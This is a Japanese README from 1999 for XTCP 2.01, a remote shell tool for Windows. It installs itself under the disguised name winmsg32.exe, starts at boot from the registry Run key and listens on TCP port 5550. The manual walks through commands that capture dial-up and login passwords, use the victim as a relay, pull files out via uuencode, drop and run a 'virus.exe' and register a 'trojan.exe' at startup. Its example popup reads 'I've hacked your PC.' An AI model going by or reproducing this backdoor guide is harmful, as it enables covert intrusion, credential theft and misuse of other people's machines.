@@ -1,0 +1,162 @@
+        Tiny remote shell service program for Windows - XTCP Version 2.01
+                     Produced The Shadow Penguin Security
+                      http://shadowpenguin.backsection.net
+          Developed by UNYUN (shadowpenguin@backsection.net), 1999/10/26 
+
+[はじめに]
+
+本プログラムはWindows用の簡易シェルサービスプログラムです。Windowsマシンに
+本プログラムをインストールすると、TCPポート5550にtelnetクライアントにて接続
+することにより、簡易シェルサービスを利用することができます。
+
+[インストール]
+
+install201.exeを実行するだけでOKです。
+ただし、install201.exeと同一ディレクトリにxtcp201.exeを置いといてください。
+これで、xtcp.exeが\windows\system\winmsg32.exeと名前を変えてインストール
+され、レジストリ登録で次回から自動起動します。
+手動でのインストールは、レジストリ
+\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+等にエントリを設定することによりWindows起動後に自動起動させることができます。
+
+
+[使用法]
+
+1. xtcpの仕込まれたターゲットのIPアドレスを調べる(ポート5550のscanでもOK)
+2. telnet target-windows 5550でxtcpにログインする．
+
+[コマンド]
+
+ログインすると、shellモドキの[ush]#というプロンプトが出ます。ここで使用できる
+コマンドを以下に述べます。なお、このshellモドキはカレントディレクトリという
+概念がありません(手抜きです)。あらゆるpathは全てドライブ名込みの絶対パスで
+書いてください。
+
+(1) ls ディレクトリ
+    指定されたディレクトリに含まれるファイルを表示します。ただし、通常のlsと
+    違い、全ファイル名を見たい場合は、必ず*.*を付けてください。
+    出力フォーマットは、
+    属性 ファイル名 サイズ 日付
+    固定です。属性は、
+    a : アーカイブ
+    d : ディレクトリ
+    h : 隠しファイル
+    r : ReadOnlyファイル
+    s : システムファイル
+    です。
+    [例]
+    ls c:\*.*           : c:\に含まれる全ファイルを表示
+    ls c:\windows\*.ini : c:\windowsに含まれる拡張子.iniのファイルを全て表示
+
+(2) cat テキストファイル
+    テキストファイルの内容を表示
+    [例] cat c:\Setuplog.old
+
+(3) cp 元ファイル コピー先ファイル
+    ファイルをコピーする
+    [例] cp c:\Setuplog.old c:\windows\aaa
+
+(4) rm ファイル
+    ファイルを削除する
+
+(5) ren 変更するファイル 変更後のファイル名
+    ファイル名を変更する
+
+(6) exec 実行ファイル
+    実行ファイルを実行する。引数も可能。
+    ただし、Winの特性上GUIを伴うものは注意しないといけないですよ。
+    いきなりターゲットのWinで窓が開いちゃいます。
+
+(7) mktext ファイル
+    テキストファイルを作成する
+    [例]
+    [ush]#mktext c:\test.txt
+    aaa bbb
+    ccc
+    ^D          ctrl+Dキーで終了
+    [ush]#
+
+(8) popup メッセージ
+    ターゲットWinにポップアップメッセージを出す
+    [例]
+    popup Hello. I've hacked your PC. Sorry.
+
+(9) shutdown
+    ターゲットのPCをシャットダウンします。
+
+(10) reboot
+    ターゲットのPCを再起動します。
+
+(11) passwd [-s][-t][-d]
+    Win95/98標準の例の接続ウインドウが表われた時、および認証Windowが表われ
+    た時にアカウント情報を抜いてログとして保存します。
+    よって、標準のPPP接続を使わなかった、あるいは仕込み後一度もPPPしてない
+    ときなんかはPPPログは残りませんし、認証Windowを一度も出さなかったら
+    Authログも残りません。
+
+    PPP,認証アカウントのログ操作
+    -s : ロギング開始
+    -t : ロギング終了
+    -d : ログファイル削除
+    引数無し : ログ表示
+
+(12) xtelnet ターゲットのIPアドレス ポート
+    使い方はtelnetと同じ。要するに踏み台です。
+    ポートは、telnetなら23、pop3なら110といった感じです。
+
+(13) uuencode エンコードしたいファイル エンコード後のファイル
+    uuencodeでバイナリをテキストに変換します。これで、ターゲットから持って
+    来たいバイナリファイルを持って来れます。
+    [例]
+    uuencode c:\test.zip c:\test.uue
+    cat c:\test.uueで、エンコード後ファイルを表示してテキストエディタに
+    張りつけます。その後は、aishとかでバイナリに復元します。
+    (aishはwww.vector.co.jp/vpack/とかに落ちてますので)
+
+(14) uudecode デコードしたいファイル (出力ファイル)
+    uuencodeでエンコードしたテキストファイルをバイナリに復元します。
+    出力ファイルの引数を省略すると、エンコード時のファイル名で復元
+    されます。
+    [例]
+    
+    [ush]#mktext c:\virus.uue
+    begin 644 virus.exe
+     --- ここに あらかじめuuencodeしたvirus.exeを張りつける ---
+    end
+    ^d
+    [ush]#uudecode c:\virus.uue c:\xxx.exe   virus.exeを復元
+    [ush]#exec c:\xxx.exe  virus.exeを実行する
+
+(15) regrun [-c][-d][-l] 設定する値名 設定するデータ
+    
+    レジストリHKEY_LOCAL_MACHINEの
+    SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   
+    にファイルを登録します。つまり、Win起動時のファイル自動起動の登録です。
+    
+    [例]
+    <1> Win起動時にtrojan.exeを実行させる
+    regrun -c trojan c:\windows\trojan.exe
+    <2>
+    Win起動時に自動起動される項目を一覧表示
+    regrun -l
+    <3>
+    自動起動項目trojanの削除
+    regrun -d trojan
+
+(16) logout
+    終了する
+
+[削除方法]
+
+c:\windows\regedit.exeを起動して、
+\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+のキーを削除してください。
+install.exeを使っているヒトで、よくわからないヒトは、
+\windows\system\winmsg32.exe
+をごみばこにポイしてください。
+
+[コンパイル」
+
+exeで不安というヒトはコンパイルして使ってください。
+ソースはVC++5.0でコンパイルできます．
+Libにwsock32.libつけてくださいね．
